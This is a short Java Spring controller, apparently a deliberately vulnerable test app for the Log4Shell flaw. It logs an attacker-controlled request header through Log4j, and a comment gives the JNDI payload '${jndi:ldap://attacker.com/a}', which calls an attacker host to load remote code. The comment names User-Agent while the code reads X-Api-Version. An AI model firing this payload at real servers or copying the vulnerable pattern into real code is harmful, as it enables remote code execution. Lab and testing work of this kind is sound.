package com.example.log4j_test.controller;

import com.example.log4j_test.Log4jTestApplication;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;

/**
 * Created by s.shinohara on 2021/12/12.
 */
@RestController
public class TestController {

    private static final Logger logger = LogManager.getLogger(TestController.class);


    @RequestMapping("/")
    public String test(@RequestHeader("X-Api-Version") String apiVersion) {
        // String userAgent = req.getHeader("user-agent");

        // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
        // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}

        logger.info("Request User Agent:{}", apiVersion);
        return "test";
    }
}
